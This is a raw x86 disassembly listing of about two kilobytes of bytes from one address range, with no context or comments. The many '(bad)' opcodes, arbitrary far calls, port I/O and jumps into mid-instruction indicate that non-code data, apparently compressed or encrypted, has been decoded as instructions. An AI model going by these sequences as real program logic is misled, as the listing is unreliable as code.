  416591:	sbb    cl,cl
  416593:	loopne 0x41658f
  416595:	mov    dl,0x6b
  416597:	aad    0xc5
  416599:	dec    ebx
  41659a:	sar    eax,cl
  41659c:	mov    ch,0xe4
  41659e:	lds    eax,FWORD PTR [ebx+0x6]
  4165a1:	adc    DWORD PTR [ebp+0x7],ebx
  4165a4:	dec    esi
  4165a5:	xchg   ebx,eax
  4165a6:	adc    al,ch
  4165a8:	cmp    esp,DWORD PTR [eax+ebp*8-0x61]
  4165ac:	and    DWORD PTR [esi+0x1a],ebx
  4165af:	xor    DWORD PTR [ebp+ebx*8+0xe],ebp
  4165b3:	add    BYTE PTR [ecx-0x7d],bl
  4165b6:	aad    0x5
  4165b8:	xor    BYTE PTR [eax-0x452ae075],bl
  4165be:	ins    DWORD PTR es:[edi],dx
  4165bf:	mov    bl,0xf3
  4165c1:	sbb    DWORD PTR [edi-0x1a2269ca],ecx
  4165c7:	(bad)  
  4165c8:	pop    ecx
  4165c9:	fcomp  QWORD PTR [eax]
  4165cb:	mov    dl,BYTE PTR [ecx]
  4165cd:	mov    cl,0xba
  4165cf:	pop    eax
  4165d0:	sub    al,BYTE PTR [ebp-0x27]
  4165d3:	mov    edi,0xf20b13f6
  4165d8:	mov    bl,0x4a
  4165da:	dec    esp
  4165db:	mov    edx,0x4a083117
  4165e0:	stos   DWORD PTR es:[edi],eax
  4165e1:	sub    BYTE PTR [ebp-0x76],dh
  4165e4:	pop    eax
  4165e5:	loopne 0x41665e
  4165e7:	lds    eax,FWORD PTR [ebx-0x1954bd6a]
  4165ed:	outs   dx,BYTE PTR ds:[esi]
  4165ee:	pop    ecx
  4165ef:	(bad)  
  4165f0:	dec    ebp
  4165f1:	imul   esi,ecx,0xfce2bdc7
  4165f7:	(bad)  
  4165f8:	xor    BYTE PTR [eax],dl
  4165fa:	jmp    0x416639
  4165fc:	(bad)  
  4165fd:	fimul  DWORD PTR [eax]
  4165ff:	lods   al,BYTE PTR es:[esi]
  416601:	sbb    ch,BYTE PTR [edx]
  416603:	stos   DWORD PTR es:[edi],eax
  416604:	dec    esi
  416605:	pop    esi
  416606:	stc    
  416607:	aaa    
  416608:	jnp    0x41658a
  41660a:	nop
  41660b:	or     BYTE PTR [edi+0x9],al
  41660e:	inc    eax
  41660f:	out    0xaa,al
  416611:	pop    ecx
  416612:	cmp    DWORD PTR [ebp-0x60f385d3],edx
  416618:	adc    BYTE PTR [ebx+0x78465090],dl
  41661e:	stos   BYTE PTR es:[edi],al
  41661f:	in     eax,dx
  416620:	adc    edi,DWORD PTR [esi-0x3126c267]
  416626:	xor    dh,ah
  416628:	repz fsub st(6),st
  41662b:	call   0xdd3118b5
  416630:	pop    es
  416631:	or     eax,0x2f2ecba2
  416636:	cmp    BYTE PTR [ecx-0x10],ah
  416639:	cmp    BYTE PTR [ebx+0x4e],ah
  41663c:	mov    ebp,0xe0b54b47
  416641:	outs   dx,DWORD PTR ds:[esi]
  416642:	jmp    0x4166aa
  416644:	add    eax,0xa549eac4
  416649:	sbb    ah,BYTE PTR [edi+0x347ac9b9]
  41664f:	sub    edx,DWORD PTR [eax+0x11]
  416652:	popf   
  416653:	jno    0x4166cb
  416655:	xchg   edx,eax
  416656:	add    eax,0xae05bcd9
  41665b:	sbb    eax,0xd2202787
  416660:	mov    eax,ds:0xb5814d1e
  416665:	adc    BYTE PTR [esi],bl
  416667:	int3   
  416668:	sub    BYTE PTR [esp+ecx*8+0x50],dl
  41666c:	(bad)  
  41666d:	mov    esp,0x3cdb44a9
  416672:	sbb    eax,0xe9528bbc
  416677:	dec    BYTE PTR [eax]
  416679:	(bad)  
  41667a:	mov    esi,0x1e6ab8e2
  41667f:	test   BYTE PTR [eax],al
  416681:	sub    bh,BYTE PTR [eax+0x7c51f174]
  416687:	inc    esi
  416688:	mov    dl,0x7e
  41668a:	jp     0x4166dd
  41668c:	mov    ds:0x47c59100,al
  416691:	add    BYTE PTR [ebx+0x2b3ff254],bh
  416697:	rcr    ah,1
  416699:	mov    ch,0x8b
  41669c:	mov    ebx,0xd9fe2ba2
  4166a1:	jg     0x4166eb
  4166a3:	stos   DWORD PTR es:[edi],eax
  4166a4:	dec    edi
  4166a5:	xchg   ebx,eax
  4166a6:	jo     0x4166d9
  4166a8:	(bad)  
  4166a9:	ins    BYTE PTR es:[edi],dx
  4166aa:	leave  
  4166ab:	xchg   ebp,eax
  4166ac:	sub    DWORD PTR [esi],0xde1cccd1
  4166b2:	in     al,dx
  4166b3:	add    eax,0x4a10a065
  4166b8:	int    0xb9
  4166ba:	inc    ebx
  4166bb:	mov    eax,ds:0x2cff2bb7
  4166c0:	outs   dx,BYTE PTR ds:[esi]
  4166c1:	popa   
  4166c2:	fldpi  
  4166c4:	mov    DWORD PTR [ecx+0x6],0xfbb767b7
  4166cb:	cmp    al,0x32
  4166cd:	pop    esi
  4166ce:	dec    ebp
  4166cf:	sub    eax,0x22b8f161
  4166d4:	les    esp,FWORD PTR [ebp-0x3a5081dd]
  4166da:	inc    eax
  4166db:	xchg   edi,eax
  4166dc:	mov    edx,0x1449216e
  4166e1:	push   es
  4166e2:	adc    dh,BYTE PTR [esi-0x4e68fc80]
  4166e8:	xchg   ebx,eax
  4166e9:	imul   ecx,DWORD PTR [ebp-0x5ac89902],0x18
  4166f0:	cmp    ecx,eax
  4166f2:	mov    ebx,0x5d231c97
  4166f7:	sti    
  4166f8:	add    al,0x5e
  4166fa:	mov    edi,0x14f811cc
  4166ff:	stc    
  416700:	fwait
  416701:	enter  0x6121,0x32
  416705:	jecxz  0x41675b
  416707:	pop    es
  416708:	aas    
  416709:	enter  0x541a,0xef
  41670d:	pusha  
  41670e:	call   0xefa8:0x8d0df742
  416715:	adc    esp,DWORD PTR [ecx+0x76]
  416718:	and    bh,BYTE PTR [eax+0xd]
  41671b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41671c:	mov    ds:0x312e09d5,eax
  416721:	jno    0x416708
  416723:	or     al,0x2a
  416725:	lahf   
  416726:	push   edx
  416727:	rol    ch,1
  416729:	in     al,dx
  41672a:	cdq    
  41672b:	aad    0xbd
  41672d:	(bad)  
  41672e:	icebp  
  41672f:	dec    eax
  416730:	(bad)  
  416731:	pop    ds
  416732:	inc    esi
  416733:	mov    bl,0x76
  416735:	push   esp
  416736:	adc    ebp,DWORD PTR [edi]
  416738:	cmp    DWORD PTR [edi+0x165fd19d],edx
  41673e:	push   ebx
  41673f:	sub    ebp,DWORD PTR [edi-0x36b222a5]
  416745:	jmp    0xf01e20e9
  41674a:	test   ch,dl
  41674c:	test   DWORD PTR [ecx-0x68],edi
  41674f:	imul   eax,DWORD PTR [ecx+0x27ed99f7],0xffffffaf
  416756:	xchg   ebp,eax
  416757:	in     al,dx
  416758:	xchg   esi,eax
  416759:	test   DWORD PTR [ecx-0x5b9f7cd],eax
  41675f:	js     0x4166ff
  416761:	jo     0x4167b5
  416763:	mov    bh,0x7d
  416765:	sub    BYTE PTR [ebp+0x4a],bl
  416768:	sub    DWORD PTR [ecx+eiz*2+0x320a013d],ecx
  41676f:	sub    BYTE PTR [esi+0x10],0x6c
  416773:	push   esi
  416774:	retf   
  416775:	mov    esi,0x964b7cf8
  41677a:	mov    bl,0x6f
  41677c:	adc    edx,esp
  41677e:	jo     0x4167ff
  416780:	gs mov ebx,0x26b110d2
  416786:	xchg   edi,eax
  416787:	cdq    
  416788:	leave  
  416789:	in     al,0x35
  41678b:	push   0xffffff92
  41678d:	adc    BYTE PTR [edi],al
  41678f:	add    al,0x72
  416791:	stos   BYTE PTR es:[edi],al
  416792:	lock js 0x41677e
  416795:	jns    0x416745
  416797:	jae    0x4167a6
  416799:	jmp    0x41671d
  41679b:	sahf   
  41679c:	pop    ecx
  41679d:	icebp  
  41679e:	arpl   WORD PTR [edx+ebx*8-0x48bfde42],dx
  4167a5:	push   edx
  4167a6:	sub    bh,cl
  4167a8:	sub    al,BYTE PTR [ebp+eax*1-0x1]
  4167ac:	in     al,dx
  4167ad:	outs   dx,BYTE PTR fs:[esi]
  4167af:	mov    dl,0xe
  4167b1:	dec    esp
  4167b2:	cmp    al,BYTE PTR [eax]
  4167b4:	pop    esi
  4167b5:	(bad)  
  4167b6:	jo     0x4167df
  4167b8:	js     0x41681a
  4167ba:	mov    bh,0x15
  4167bc:	test   BYTE PTR [ebp+0x2e],cl
  4167bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167c0:	add    eax,0x8e3d0f54
  4167c5:	shl    DWORD PTR [ebx],cl
  4167c7:	mov    ax,ds:0x8c6198c4
  4167cd:	js     0x416790
  4167cf:	dec    edx
  4167d0:	adc    DWORD PTR [edi],esi
  4167d2:	aas    
  4167d3:	jg     0x41684e
  4167d5:	inc    ebx
  4167d6:	cmp    esp,DWORD PTR [edi]
  4167d8:	(bad)  
  4167d9:	in     eax,0xe0
  4167db:	sbb    BYTE PTR [ebp+0x3f],bl
  4167de:	ror    BYTE PTR [esi-0x14],1
  4167e1:	push   esp
  4167e2:	adc    al,BYTE PTR [esi-0xfcda1e3]
  4167e8:	fisub  DWORD PTR [edi+ebx*8-0x2d]
  4167ec:	mov    bl,0x52
  4167ee:	xchg   edi,eax
  4167ef:	cmp    eax,0xdb418122
  4167f4:	sub    al,0xbd
  4167f6:	les    esi,FWORD PTR [eax-0x74d0e177]
  4167fc:	(bad)  
  4167fd:	rol    DWORD PTR [edi],cl
  4167ff:	xor    ah,bl
  416801:	lahf   
  416802:	ja     0x416845
  416804:	add    al,0x5a
  416806:	add    DWORD PTR [esi],esp
  416808:	lods   al,BYTE PTR ds:[esi]
  416809:	sbb    eax,0x3355cb82
  41680e:	pop    ebx
  41680f:	adc    DWORD PTR [esi-0x51],eax
  416812:	call   0xbb4c:0xe879c37a
  416819:	lds    edx,FWORD PTR [ecx+0x37]
  41681c:	add    BYTE PTR [ecx-0xc280a79],al
  416822:	(bad)  
  416823:	pop    esi
  416824:	add    ecx,DWORD PTR [edi]
  416826:	mov    bh,0x10
  416828:	ficomp DWORD PTR [esi]
  41682a:	imul   edi,DWORD PTR [edx+edx*8+0x95c030e],0xfffffff6
  416832:	les    ebp,FWORD PTR [ecx+ebp*4+0x560b9a9a]
  416839:	sti    
  41683a:	add    edi,DWORD PTR ds:0xb40c9216
  416840:	mov    dl,0x5b
  416842:	xchg   edi,eax
  416843:	ror    BYTE PTR [edi*2-0x79dd5d14],0x29
  41684b:	enter  0xa0a6,0x3c
  41684f:	ja     0x416880
  416851:	mov    bl,0x2c
  416853:	ret    0xcf3d
  416856:	inc    esi
  416857:	or     BYTE PTR [edx+ebx*4],bl
  41685a:	mov    bl,0x38
  41685c:	jmp    0x4168be
  41685e:	ja     0x4168d3
  416860:	scas   al,BYTE PTR es:[edi]
  416861:	pop    es
  416862:	mov    DWORD PTR [ecx-0x32],esi
  416865:	icebp  
  416866:	mov    ds:0x7183cf91,al
  41686b:	sbb    BYTE PTR [edi-0x1d97ebb0],ch
  416871:	cmc    
  416872:	popa   
  416873:	jns    0x4168bb
  416875:	and    ebx,DWORD PTR [esi]
  416877:	arpl   WORD PTR [edx-0x20],sp
  41687a:	(bad)  
  41687b:	pop    esi
  41687c:	mov    cl,BYTE PTR [esi-0x49b565f7]
  416882:	rol    bh,0x39
  416885:	aas    
  416886:	cmp    eax,0x6d47dfd6
  41688b:	loopne 0x41686c
  41688d:	xor    eax,0x778c9f90
  416892:	adc    esi,edi
  416894:	jbe    0x416845
  416896:	int3   
  416897:	pop    esp
  416898:	cmp    ecx,edi
  41689a:	in     eax,dx
  41689b:	jmp    0x416906
  41689d:	in     al,dx
  41689e:	(bad)  
  41689f:	jmp    FWORD PTR [edi+ebp*4]
  4168a2:	pop    ebp
  4168a3:	cmp    BYTE PTR [ecx+ecx*2],dl
  4168a6:	into   
  4168a7:	cmp    BYTE PTR [edx-0x3a],dl
  4168aa:	test   BYTE PTR [esi],0xc4
  4168ad:	(bad)  
  4168ae:	in     eax,dx
  4168af:	shl    BYTE PTR [ebx+0x4206b89],cl
  4168b5:	or     BYTE PTR [ebx],al
  4168b7:	repnz cli 
  4168b9:	imul   eax,DWORD PTR [eax],0x72
  4168bc:	adc    cl,ah
  4168be:	(bad)  
  4168bf:	popa   
  4168c0:	pop    eax
  4168c1:	es ja  0x41693c
  4168c4:	stos   BYTE PTR es:[edi],al
  4168c5:	push   cs
  4168c6:	dec    edi
  4168c7:	int3   
  4168c8:	pop    esi
  4168c9:	adc    dh,BYTE PTR [eax-0x39f4f65c]
  4168cf:	std    
  4168d0:	or     BYTE PTR [eax+0x49052fd8],dh
  4168d6:	(bad)  
  4168d8:	mov    esi,0xbc3c702c
  4168dd:	and    DWORD PTR [ebx+0x9],ecx
  4168e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4168e1:	mov    esi,cs
  4168e3:	add    al,0x7a
  4168e5:	push   edx
  4168e6:	push   esi
  4168e7:	ror    BYTE PTR [eax+ecx*4-0x7a],cl
  4168eb:	jbe    0x416951
  4168ed:	adc    DWORD PTR [di+0x65],edi
  4168f1:	and    esi,DWORD PTR [ecx]
  4168f3:	fs inc ebx
  4168f5:	mov    cs,WORD PTR [edx]
  4168f7:	cmp    eax,DWORD PTR [ecx-0x7a0f9d89]
  4168fd:	call   0x17b8:0xda1cd271
  416904:	ror    DWORD PTR [eax+ebx*4+0x38c70d5e],0xa5
  41690c:	xor    dl,BYTE PTR [esi]
  41690e:	xchg   ecx,eax
  41690f:	push   DWORD PTR [ecx+0x10]
  416912:	je     0x4168a4
  416914:	outs   dx,DWORD PTR ds:[esi]
  416915:	cmp    BYTE PTR [eax-0x2b],al
  416918:	or     BYTE PTR [ecx+ebp*8],0x4c
  41691c:	add    al,0x1f
  41691e:	dec    ecx
  41691f:	bnd jb 0x416988
  416922:	adc    edx,esi
  416924:	in     eax,dx
  416925:	push   edi
  416926:	lds    eax,FWORD PTR [esi+eiz*1]
  416929:	or     edi,DWORD PTR [ebx+0x1f]
  41692c:	cld    
  41692d:	xchg   esp,eax
  41692e:	call   0x4103cf8a
  416933:	sbb    BYTE PTR ds:0xa033acb5,dl
  416939:	push   ss
  41693a:	xor    eax,0x85ffe3e2
  41693f:	inc    edi
  416940:	xor    DWORD PTR [ecx],esi
  416942:	jmp    0x416932
  416944:	mov    al,0xc9
  416946:	std    
  416947:	inc    ebx
  416948:	sub    BYTE PTR [ebp-0x28],dh
  41694b:	dec    edx
  41694c:	nop
  41694d:	pop    esp
  41694e:	add    ebx,edx
  416950:	jl     0x4168f9
  416952:	call   0xe76eaccf
  416957:	xor    BYTE PTR [eax-0x1a],dl
  41695a:	push   eax
  41695b:	lock pusha 
  41695d:	adc    cl,BYTE PTR [ecx-0x2b]
  416960:	call   0x7216:0x257e3df
  416967:	imul   eax,DWORD PTR [edx-0x34c398c5],0x3e9f804a
  416971:	nop
  416972:	cmc    
  416973:	xor    al,BYTE PTR [ebp-0x337c044b]
  416979:	add    eax,0x33d91c70
  41697e:	xor    ah,BYTE PTR [edi]
  416980:	push   cs
  416981:	fidivr DWORD PTR [ebp-0x1870bb42]
  416987:	mov    ebx,0x4e3d999
  41698c:	jne    0x416949
  41698e:	adc    BYTE PTR [edx-0x5dc3948f],ah
  416994:	xor    eax,0x43d847b4
  416999:	mov    ah,0xa4
  41699b:	xor    edi,edx
  41699d:	sub    ecx,DWORD PTR [ebp-0x416e698c]
  4169a3:	push   ss
  4169a4:	push   ebx
  4169a5:	popf   
  4169a6:	data16 aas 
  4169a8:	lods   al,BYTE PTR ds:[esi]
  4169a9:	sub    edx,DWORD PTR [ebp+0x4368d0c6]
  4169af:	not    BYTE PTR [edi+0x6e]
  4169b2:	and    dl,BYTE PTR [esi-0x3cbb0d8]
  4169b8:	jge    0x4169ff
  4169ba:	std    
  4169bb:	ret    0xa361
  4169be:	mov    ah,0x1a
  4169c0:	mov    bl,0x62
  4169c2:	dec    esi
  4169c3:	out    0xbb,eax
  4169c5:	adc    al,0xa7
  4169c7:	dec    edi
  4169c8:	stc    
  4169c9:	std    
  4169ca:	push   ebx
  4169cb:	lods   al,BYTE PTR ds:[esi]
  4169cc:	inc    ebx
  4169cd:	mov    esp,0x64c25c60
  4169d2:	and    BYTE PTR [edx-0x7aa0281a],ch
  4169d8:	adc    bh,BYTE PTR [edi+edi*2+0x7b270c89]
  4169df:	outs   dx,BYTE PTR ds:[esi]
  4169e0:	loop   0x4169f2
  4169e2:	int    0x52
  4169e4:	call   0x9c7c:0x53e7a338
  4169eb:	and    ebx,edi
  4169ed:	mov    ecx,esp
  4169ef:	mov    dl,0x69
  4169f1:	or     ebx,DWORD PTR [esi-0x14bba69e]
  4169f7:	inc    esp
  4169f8:	or     eax,0x17494222
  4169fd:	repnz shr BYTE PTR [ebp-0x79b6e462],1
  416a04:	std    
  416a05:	popa   
  416a06:	das    
  416a07:	shl    ch,0x27
  416a0a:	cmp    DWORD PTR [edi],eax
  416a0c:	cmp    al,bl
  416a0e:	out    dx,al
  416a0f:	mov    ch,0x2f
  416a11:	pop    ecx
  416a12:	push   cs
  416a13:	push   eax
  416a14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a15:	xor    al,0x9d
  416a17:	cmp    esp,edi
  416a19:	fmul   QWORD PTR [edi+0x26]
  416a1c:	lock rol DWORD PTR [ebx],1
  416a1f:	sub    eax,0x2d32c69f
  416a24:	fstp   DWORD PTR [esp+edx*4+0x55c2a8cd]
  416a2b:	sbb    eax,0xb3dcc696
  416a30:	add    edi,DWORD PTR [edi+0x43024784]
  416a36:	(bad)  
  416a37:	mov    eax,ds:0xbfd9267f
  416a3c:	push   esi
  416a3d:	adc    edx,DWORD PTR [edx+0x1253ad9]
  416a43:	fsub   QWORD PTR [ebx+0x7a26813c]
  416a49:	arpl   WORD PTR [esi-0x58],si
  416a4c:	cwde   
  416a4d:	fs in  al,dx
  416a4f:	ins    BYTE PTR es:[edi],dx
  416a50:	jnp    0x416aa4
  416a52:	(bad)  
  416a53:	push   0x8a517769
  416a58:	jg     0x416a7b
  416a5a:	ins    BYTE PTR es:[edi],dx
  416a5b:	sbb    eax,0xf166ed45
  416a60:	(bad)
  416a63:	faddp  st(3),st
  416a65:	jb     0x4169e9
  416a67:	push   esi
  416a68:	repz iret 
  416a6a:	call   0x571:0x4e18b052
  416a71:	inc    eax
  416a72:	jnp    0x416aad
  416a74:	adc    BYTE PTR ds:0x13415ac4,ah
  416a7a:	jg     0x416ac8
  416a7c:	sbb    BYTE PTR [ecx+0x659e5aa6],ch
  416a82:	pushf  
  416a83:	inc    esi
  416a84:	jne    0x416a5d
  416a86:	dec    esi
  416a87:	sub    DWORD PTR [edi+0x41fe6f0d],ecx
  416a8d:	imul   ebp,DWORD PTR [edx-0x4d],0x586d22d7
  416a94:	arpl   WORD PTR [ebp+ebp*2-0x61],di
  416a98:	pop    eax
  416a99:	repz mov ebp,0x54a2b73d
  416a9f:	in     al,dx
  416aa0:	jo     0x416b05
  416aa2:	icebp  
  416aa3:	imul   ebp,ebp,0x3c1ca90
  416aa9:	cmp    BYTE PTR [edx],bl
  416aab:	xor    DWORD PTR [ebx-0x1c194a09],edx
  416ab1:	sub    ch,ch
  416ab3:	xor    ecx,eax
  416ab5:	push   ecx
  416ab6:	test   DWORD PTR [ebp-0x72],eax
  416ab9:	pop    edi
  416aba:	aad    0xf8
  416abc:	add    eax,0xfc20be52
  416ac1:	not    DWORD PTR [ebx+0x26]
  416ac4:	mov    dl,0x16
  416ac6:	push   esi
  416ac7:	fldcw  WORD PTR [edx+0xcebc2c4]
  416acd:	and    al,0xf1
  416acf:	push   cs
  416ad0:	int3   
  416ad1:	outs   dx,DWORD PTR ds:[esi]
  416ad2:	inc    ebx
  416ad3:	push   eax
  416ad4:	adc    eax,0x271163f2
  416ad9:	ja     0x416b26
  416adb:	imul   edi,DWORD PTR [eax-0x4f9e7036],0x47
  416ae2:	dec    edx
  416ae3:	gs call 0x7736852f
  416ae9:	xchg   ecx,eax
  416aea:	into   
  416aeb:	repz fs push 0x665b7326
  416af2:	test   BYTE PTR [edi-0x5cdc9a8d],cl
  416af8:	nop
  416af9:	sahf   
  416afa:	cs stos BYTE PTR es:[edi],al
  416afc:	gs pop ecx
  416afe:	into   
  416aff:	push   ebp
  416b00:	repz scas eax,DWORD PTR es:[edi]
  416b02:	js     0x416b14
  416b04:	push   esp
  416b06:	sbb    bl,BYTE PTR [esi-0x6458b412]
  416b0c:	shl    DWORD PTR [ebp*1+0x1b56a86c],cl
  416b13:	dec    ebp
  416b14:	loopne 0x416aa1
  416b16:	sub    DWORD PTR [esi+0x74c1feeb],0xffffff9c
  416b1d:	outs   dx,BYTE PTR ds:[esi]
  416b1e:	outs   dx,DWORD PTR ds:[esi]
  416b1f:	call   0x2c92:0xd8cd64ac
  416b26:	adc    al,0xa6
  416b28:	test   al,0x23
  416b2a:	jne    0x416b30
  416b2c:	mov    ecx,0xe3ec57e9
  416b31:	sub    ebp,DWORD PTR [eax]
  416b33:	(bad)  [ebx+0x228170f6]
  416b39:	std    
  416b3a:	cmp    DWORD PTR [ecx-0x70],eax
  416b3d:	dec    edi
  416b3e:	jmp    0x416b9d
  416b40:	mov    al,ds:0xd7a5a2da
  416b45:	cmp    eax,0xcdfe6c7
  416b4a:	jne    0x416b2e
  416b4c:	mov    ecx,0xeac6fee4
  416b51:	mov    edi,0x7a4e31b0
  416b56:	mov    ch,0x77
  416b58:	in     al,dx
  416b59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b5a:	shl    BYTE PTR [esi-0x4e69af3],0x82
  416b61:	aas    
  416b62:	adc    DWORD PTR [ebx+0x6abfa44a],0x34
  416b69:	xchg   BYTE PTR fs:[ebx+0x6a],ah
  416b6d:	call   0x6d9f:0xdb07767b
  416b74:	lahf   
  416b75:	mov    eax,0xe070dc9e
  416b7a:	dec    ebx
  416b7b:	pop    esp
  416b7c:	xchg   ecx,eax
  416b7d:	cmp    ebp,ecx
  416b7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b80:	or     dh,dl
  416b82:	hlt    
  416b83:	xor    ch,0x1e
  416b86:	retf   
  416b87:	call   0x9ada2df0
  416b8c:	fcmovnbe st,st(2)
  416b8e:	loopne 0x416bb8
  416b90:	fdiv   DWORD PTR [eax-0x1e]
  416b93:	sbb    eax,0xb5bc9bc7
  416b98:	ror    BYTE PTR [ebp-0x66],1
  416b9b:	jo     0x416b3c
  416b9d:	ins    BYTE PTR es:[edi],dx
  416b9e:	repz inc esp
  416ba0:	mov    ds:0x52d254f1,eax
  416ba5:	push   edx
  416ba6:	xor    ch,BYTE PTR [eax+0xe97bbcc]
  416bac:	aam    0xcd
  416bae:	dec    esp
  416baf:	or     DWORD PTR [edi+0x3c382838],ebx
  416bb5:	mov    al,0x2e
  416bb7:	ret    
  416bb8:	xor    eax,0xbfb4c449
  416bbd:	daa    
  416bbe:	sbb    DWORD PTR [edx+0x4355a97e],0x52
  416bc5:	scas   eax,DWORD PTR es:[edi]
  416bc6:	xlat   BYTE PTR ds:[ebx]
  416bc7:	xchg   ecx,eax
  416bc8:	test   al,0x1c
  416bca:	add    dh,BYTE PTR [esp+eax*4+0x3741f75b]
  416bd1:	outs   dx,DWORD PTR ds:[esi]
  416bd2:	pushf  
  416bd3:	push   ss
  416bd4:	cld    
  416bd5:	xchg   BYTE PTR [ebp-0x4c],cl
  416bd8:	jle    0x416be8
  416bda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416bdb:	xor    ebx,DWORD PTR [edx-0x371503a0]
  416be1:	ret    0x8e87
  416be4:	jb     0x416c3a
  416be6:	sbb    esp,edi
  416be8:	pop    ebp
  416be9:	adc    al,0xec
  416beb:	aaa    
  416bec:	retf   0xf98f
  416bef:	jge    0x416bea
  416bf1:	in     al,0xc8
  416bf3:	dec    edx
  416bf4:	xchg   esi,eax
  416bf5:	mov    esp,0x1ef01e66
  416bfa:	and    DWORD PTR [esi],ebx
  416bfc:	or     bh,BYTE PTR [edi]
  416bfe:	(bad)  
  416bff:	xor    dh,BYTE PTR [edi-0x32]
  416c02:	nop
  416c03:	out    0x9b,al
  416c05:	dec    edi
  416c06:	hlt    
  416c07:	mov    ebx,0x8503b0c0
  416c0c:	mov    eax,ds:0xe56f8c22
  416c11:	xchg   edi,eax
  416c12:	nop
  416c13:	ins    BYTE PTR es:[edi],dx
  416c14:	cmp    esp,esi
  416c16:	aam    0xe3
  416c18:	pushf  
  416c19:	(bad)  
  416c1b:	shr    DWORD PTR [esi],1
  416c1d:	sbb    eax,0x53ed9f48
  416c22:	scas   eax,DWORD PTR es:[edi]
  416c23:	(bad)  
  416c25:	test   DWORD PTR [edi-0x7a],esp
  416c28:	xor    ebp,DWORD PTR [esi-0x60b71142]
  416c2e:	adc    ebp,DWORD PTR [esi+0x4c]
  416c31:	cmp    DWORD PTR [edx+esi*8+0x31cb4276],0xffffffed
  416c39:	sub    al,0xbf
  416c3b:	sar    ah,1
  416c3d:	jo     0x416bf2
  416c3f:	push   eax
  416c40:	les    esp,FWORD PTR [esi+eiz*8+0x767c2f12]
  416c47:	push   edx
  416c48:	fidiv  DWORD PTR [esi+0x6abd23d6]
  416c4e:	lods   eax,DWORD PTR ds:[esi]
  416c4f:	bound  esp,QWORD PTR [ebx-0x28659fb1]
  416c55:	dec    edx
  416c56:	push   cs
  416c57:	xchg   ebx,eax
  416c58:	push   edx
  416c59:	ds rcr cl,cl
  416c5c:	dec    edx
  416c5d:	inc    eax
  416c5e:	mov    eax,DWORD PTR [esi-0x20]
  416c61:	(bad)  [eax-0x63]
  416c64:	cmp    eax,0x9bf2d21e
  416c69:	cli    
  416c6a:	pop    esp
  416c6b:	daa    
  416c6c:	lea    edx,[ecx+0x1c]
  416c6f:	out    0x7a,eax
  416c71:	xor    esi,DWORD PTR [eax-0x5c11fae2]
  416c77:	inc    eax
  416c78:	popa   
  416c79:	sbb    BYTE PTR [ecx-0x194cf62c],ah
  416c7f:	retf   0xab0f
  416c82:	cmp    eax,0xd99b1dd3
  416c87:	xor    DWORD PTR [eax+0x28fe275a],esp
  416c8d:	fs push ebx
  416c8f:	(bad)  [esp+ecx*8+0x4be5f675]
  416c96:	jp     0x416d04
  416c98:	aas    
  416c99:	cmp    esp,ebx
  416c9b:	leave  
  416c9c:	push   ecx
  416c9d:	push   es
  416c9e:	xor    eax,0x5432acbd
  416ca3:	test   DWORD PTR [eax+0x5c049017],0xc29ccfd
  416cad:	outs   dx,DWORD PTR ds:[esi]
  416cae:	adc    ebx,DWORD PTR [ecx+ebp*4+0x30]
  416cb2:	fnsave [esi*8-0x6008aefb]
  416cb9:	rol    DWORD PTR [ecx],1
  416cbb:	push   ds
  416cbc:	es push ebx
  416cbe:	test   ebx,edx
  416cc0:	add    al,0x7
  416cc2:	pop    ss
  416cc3:	clc    
  416cc4:	clc    
  416cc5:	test   eax,0xf41449e7
  416cca:	outs   dx,DWORD PTR ds:[esi]
  416ccb:	adc    eax,0xb30c33ca
  416cd0:	and    eax,0x85cdf31
  416cd5:	nop
  416cd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416cd7:	and    BYTE PTR [edi+0x7c],ah
  416cda:	call   0x839bb5df
  416cdf:	cmp    DWORD PTR [ebx],0x8ff7b1e7
  416ce5:	fcomp  QWORD PTR [esi+0x6a927a8d]
  416ceb:	or     ch,0xd1
  416cee:	iret   
  416cef:	mov    ecx,0x6fa3d53d
  416cf4:	xor    eax,0x4cdef37f
  416cf9:	xchg   BYTE PTR [esi],dl
  416cfb:	push   edx
  416cfc:	icebp  
  416cfd:	ds popa 
  416cff:	lods   eax,DWORD PTR ds:[esi]
  416d00:	push   ss
  416d01:	dec    esi
  416d02:	mov    dh,0x17
  416d04:	int    0x42
  416d06:	ss jge 0x416c98
  416d09:	jno    0x416d07
  416d0b:	sub    eax,0x1e19d21e
  416d10:	dec    esi
  416d11:	arpl   WORD PTR [edi],ax
  416d13:	shl    DWORD PTR [edi-0x61e5e1d3],cl
  416d19:	fdivr  DWORD PTR [eax]
  416d1b:	cmp    eax,0xca633e1b
  416d20:	in     eax,0xd3
  416d22:	mov    edi,0x72eb5b18
  416d27:	loope  0x416cf6
  416d29:	icebp  
  416d2a:	dec    edi
  416d2b:	rcr    BYTE PTR [edi+ecx*8-0x7c],1
  416d2f:	xchg   ebx,eax
  416d30:	out    0xcb,al
  416d32:	inc    edx
  416d33:	mov    BYTE PTR [esi+0x5118d31e],dl
  416d39:	jecxz  0x416ce5
  416d3b:	cmp    esp,DWORD PTR [ecx-0x60]
  416d3e:	ja     0x416d7c
  416d40:	fs jb  0x416d33
  416d43:	ds fsub st,st(5)
  416d46:	hlt    
  416d47:	call   0xbc4e0434
  416d4c:	icebp  
  416d4d:	rcl    DWORD PTR [edi],1
  416d4f:	xor    DWORD PTR [edi-0x751d536d],0xffffffa8
  416d56:	shl    BYTE PTR [eax+esi*1],cl
  416d59:	inc    ebx
  416d5a:	mov    eax,ds
  416d5c:	test   DWORD PTR [esi-0x42850087],ebp
  416d62:	popa   
  416d63:	mov    edi,0x4f140525
  416d68:	cmp    dh,BYTE PTR [ebx+0x48bad795]
  416d6e:	ja     0x416d82
  416d70:	cmp    DWORD PTR [esi+0x77],0x52
  416d74:	pop    edi
  416d75:	and    edi,DWORD PTR [edi+0x57]
  416d78:	sti    
  416d79:	ins    DWORD PTR es:[edi],dx
  416d7a:	gs cwde 
  416d7c:	(bad)  
  416d7d:	pop    ds
  416d7e:	js     0x416d6b
  416d80:	das    
  416d81:	mov    ah,0xfd
  416d83:	mov    BYTE PTR [esi+0x11],al
  416d86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
